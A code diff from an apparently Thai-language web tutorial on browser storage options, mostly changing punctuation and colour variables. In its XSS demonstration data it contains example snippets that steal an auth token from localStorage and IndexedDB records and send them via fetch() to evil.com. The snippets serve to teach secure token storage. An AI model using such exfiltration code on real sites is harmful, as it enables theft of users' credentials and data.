@@ -53,7 +53,7 @@ function storLocalGet() {
   if (!k) { showToast('ใส่ key ด้วย'); return; }
   const v = localStorage.getItem('_sp_' + k);
   const out = document.getElementById('stor-play-out');
-  out.textContent = v === null ? 'null — ไม่พบ key นี้' : '"' + v + '"';
+  out.textContent = v === null ? 'null: ไม่พบ key นี้' : '"' + v + '"';
   out.className = 'stor-play-out ' + (v === null ? 'stor-play-null' : 'stor-play-found');
 }
 function storLocalDelete() {
@@ -72,7 +72,7 @@ function storLocalRefresh() {
   const list = document.getElementById('stor-play-list');
   if (!list) return;
   const keys = Object.keys(localStorage).filter(k => k.startsWith('_sp_'));
-  if (!keys.length) { list.innerHTML = '<div class="stor-play-empty">ว่าง — ยังไม่มีข้อมูล</div>'; return; }
+  if (!keys.length) { list.innerHTML = '<div class="stor-play-empty">ว่าง: ยังไม่มีข้อมูล</div>'; return; }
   list.innerHTML = keys.map(k => {
     const dk = k.replace('_sp_', ''); const v = localStorage.getItem(k);
     return `<div class="stor-play-item"><span class="stor-play-k">${escHtml(dk)}</span><span class="stor-play-arr">→</span><span class="stor-play-v">"${escHtml(v)}"</span><button class="stor-play-del" data-key="${escHtml(k)}" onclick="storLocalDelItem(this)" aria-label="ลบ">${ic('x')}</button></div>`;
@@ -169,7 +169,7 @@ function storCookieAnimate() {
 
   // Done
   setTimeout(() => {
-    if(status) status.textContent = 'Cookie ถูกส่งอัตโนมัติ — browser จัดการให้ทั้งหมด JS ไม่ต้องทำอะไรเลย';
+    if(status) status.textContent = 'Cookie ถูกส่งอัตโนมัติ: browser จัดการให้ทั้งหมด JS ไม่ต้องทำอะไรเลย';
     if(pktRes) pktRes.classList.remove('stor-ck-pkt-show');
     btn.disabled = false; btn.textContent = '▶ Animate อีกครั้ง';
     _storCkRunning = false;
@@ -219,10 +219,10 @@ function storCacheAnim(type) {
 
 // Security: XSS visualization
 const _storXssData={
-  ls:{ code:`// XSS injected script:\nlocalStorage.getItem('auth_token')\n// → "eyJhbGciOiJIUzI1NiJ9..."\n\n// ส่งออก:\nfetch('https://evil.com/steal?t='+localStorage.getItem('auth_token'))`, cls:'stor-xss-danger', msg:ic('circle-x')+' อันตราย — JS อ่าน localStorage ได้ทั้งหมด XSS ขโมย token ได้ทันที' },
-  ss:{ code:`// XSS injected script:\nsessionStorage.getItem('auth_token')\n// → "eyJhbGciOiJIUzI1NiJ9..."`, cls:'stor-xss-danger', msg:ic('circle-x')+' อันตราย — sessionStorage เหมือน localStorage เลย JS อ่านได้ปกติ' },
-  hc:{ code:`// XSS injected script:\ndocument.cookie\n// → "" (ว่างเปล่า! httpOnly cookie มองไม่เห็น)\n\n// JS ไม่สามารถอ่าน httpOnly cookie ได้เลย`, cls:'stor-xss-safe', msg:ic('circle-check')+' ปลอดภัย — httpOnly cookie ถูกซ่อนจาก JavaScript ทั้งหมด XSS ขโมยไม่ได้' },
-  idb:{ code:`// XSS อ่าน IndexedDB ได้:\nindexedDB.open('myapp').onsuccess = e => {\n  const db = e.target.result;\n  const store = db.transaction('profiles')\n    .objectStore('profiles');\n  store.getAll().onsuccess = e => {\n    // ส่งข้อมูลออก...\n    fetch('https://evil.com', {\n      method: 'POST',\n      body: JSON.stringify(e.target.result)\n    });\n  };\n};`, cls:'stor-xss-warning', msg:ic('triangle-alert')+' เสี่ยง — XSS อ่าน IndexedDB ได้ อย่าเก็บ token หรือ sensitive data ใน IndexedDB' },
+  ls:{ code:`// XSS injected script:\nlocalStorage.getItem('auth_token')\n// → "eyJhbGciOiJIUzI1NiJ9..."\n\n// ส่งออก:\nfetch('https://evil.com/steal?t='+localStorage.getItem('auth_token'))`, cls:'stor-xss-danger', msg:ic('circle-x')+' อันตราย: JS อ่าน localStorage ได้ทั้งหมด XSS ขโมย token ได้ทันที' },
+  ss:{ code:`// XSS injected script:\nsessionStorage.getItem('auth_token')\n// → "eyJhbGciOiJIUzI1NiJ9..."`, cls:'stor-xss-danger', msg:ic('circle-x')+' อันตราย: sessionStorage เหมือน localStorage เลย JS อ่านได้ปกติ' },
+  hc:{ code:`// XSS injected script:\ndocument.cookie\n// → "" (ว่างเปล่า! httpOnly cookie มองไม่เห็น)\n\n// JS ไม่สามารถอ่าน httpOnly cookie ได้เลย`, cls:'stor-xss-safe', msg:ic('circle-check')+' ปลอดภัย: httpOnly cookie ถูกซ่อนจาก JavaScript ทั้งหมด XSS ขโมยไม่ได้' },
+  idb:{ code:`// XSS อ่าน IndexedDB ได้:\nindexedDB.open('myapp').onsuccess = e => {\n  const db = e.target.result;\n  const store = db.transaction('profiles')\n    .objectStore('profiles');\n  store.getAll().onsuccess = e => {\n    // ส่งข้อมูลออก...\n    fetch('https://evil.com', {\n      method: 'POST',\n      body: JSON.stringify(e.target.result)\n    });\n  };\n};`, cls:'stor-xss-warning', msg:ic('triangle-alert')+' เสี่ยง: XSS อ่าน IndexedDB ได้ อย่าเก็บ token หรือ sensitive data ใน IndexedDB' },
 };
 let _storXssCur='ls';
 function storXssSelect(id) {
@@ -248,20 +248,20 @@ const _storDt={
     {l:ic('package')+' ข้อมูลแอป (profile, draft, history)', n:'appdata'},
     {l:ic('globe')+' HTTP Response / Static Assets', n:'cache'},
   ]},
-  token:{ answer:{ type:'httpOnly Cookie', color:'#34d399', why:'httpOnly cookie ปลอดภัยที่สุด — JS อ่านไม่ได้ XSS ขโมยไม่ได้ server set ผ่าน Set-Cookie header ส่งไปกับ request อัตโนมัติ' }},
-  settings:{ answer:{ type:'localStorage', color:'#60a5fa', why:'localStorage เหมาะกับ preferences เล็กๆ เช่น theme, language, sidebar state — ใช้ง่าย synchronous แต่จำกัด 5–10 MB และเก็บได้แค่ string' }},
+  token:{ answer:{ type:'httpOnly Cookie', color:'var(--c-green)', why:'httpOnly cookie ปลอดภัยที่สุด: JS อ่านไม่ได้ XSS ขโมยไม่ได้ server set ผ่าน Set-Cookie header ส่งไปกับ request อัตโนมัติ' }},
+  settings:{ answer:{ type:'localStorage', color:'var(--c-blue)', why:'localStorage เหมาะกับ preferences เล็กๆ เช่น theme, language, sidebar state · ใช้ง่าย synchronous แต่จำกัด 5–10 MB และเก็บได้แค่ string' }},
   appdata:{ q:'ขนาดข้อมูลใหญ่กว่า 5 MB ไหม?', opts:[
     {l:'ใช่ (ใหญ่กว่า 5 MB)', n:'bigdata'},
     {l:'ไม่ (เล็กกว่า 5 MB)', n:'smalldata'},
   ]},
-  bigdata:{ answer:{ type:'IndexedDB', color:'#a78bfa', why:'IndexedDB รองรับข้อมูลขนาด GB ค้นหาด้วย index ได้ เก็บ Object/Blob ได้ทุกประเภท แนะนำใช้ผ่าน Dexie.js เพื่อ API ที่ง่ายขึ้น' }},
+  bigdata:{ answer:{ type:'IndexedDB', color:'var(--c-purple)', why:'IndexedDB รองรับข้อมูลขนาด GB ค้นหาด้วย index ได้ เก็บ Object/Blob ได้ทุกประเภท แนะนำใช้ผ่าน Dexie.js เพื่อ API ที่ง่ายขึ้น' }},
   smalldata:{ q:'ข้อมูลต้องอยู่หลังปิด tab ไหม?', opts:[
     {l:'ใช่ ต้องอยู่ตลอด', n:'persist'},
     {l:'ไม่ หายได้ตอนปิด tab', n:'session'},
   ]},
-  persist:{ answer:{ type:'localStorage หรือ IndexedDB', color:'#60a5fa', why:'ถ้าเป็น key-value ธรรมดา → localStorage ถ้าต้องการค้นหา หรือเก็บหลาย records → IndexedDB' }},
-  session:{ answer:{ type:'sessionStorage', color:'#fb923c', why:'sessionStorage เหมาะกับ multi-step form, wizard, checkout flow — ข้อมูลหายเมื่อปิด tab ซึ่งเป็นข้อดีสำหรับข้อมูลชั่วคราว' }},
-  cache:{ answer:{ type:'Cache API (Service Worker)', color:'#34d399', why:'Cache API เหมาะกับ PWA offline — เก็บ HTTP response HTML/CSS/JS/รูป ทำให้แอปทำงานได้แม้ไม่มีเน็ต dev-tools นี้ก็ใช้ Cache API อยู่!' }},
+  persist:{ answer:{ type:'localStorage หรือ IndexedDB', color:'var(--c-blue)', why:'ถ้าเป็น key-value ธรรมดา → localStorage ถ้าต้องการค้นหา หรือเก็บหลาย records → IndexedDB' }},
+  session:{ answer:{ type:'sessionStorage', color:'var(--c-orange)', why:'sessionStorage เหมาะกับ multi-step form, wizard, checkout flow · ข้อมูลหายเมื่อปิด tab ซึ่งเป็นข้อดีสำหรับข้อมูลชั่วคราว' }},
+  cache:{ answer:{ type:'Cache API (Service Worker)', color:'var(--c-green)', why:'Cache API เหมาะกับ PWA offline: เก็บ HTTP response HTML/CSS/JS/รูป ทำให้แอปทำงานได้แม้ไม่มีเน็ต dev-tools นี้ก็ใช้ Cache API อยู่!' }},
 };
 let _storDtStack=[];
 function storDtInit() { _storDtStack=[]; storDtRender('start'); }
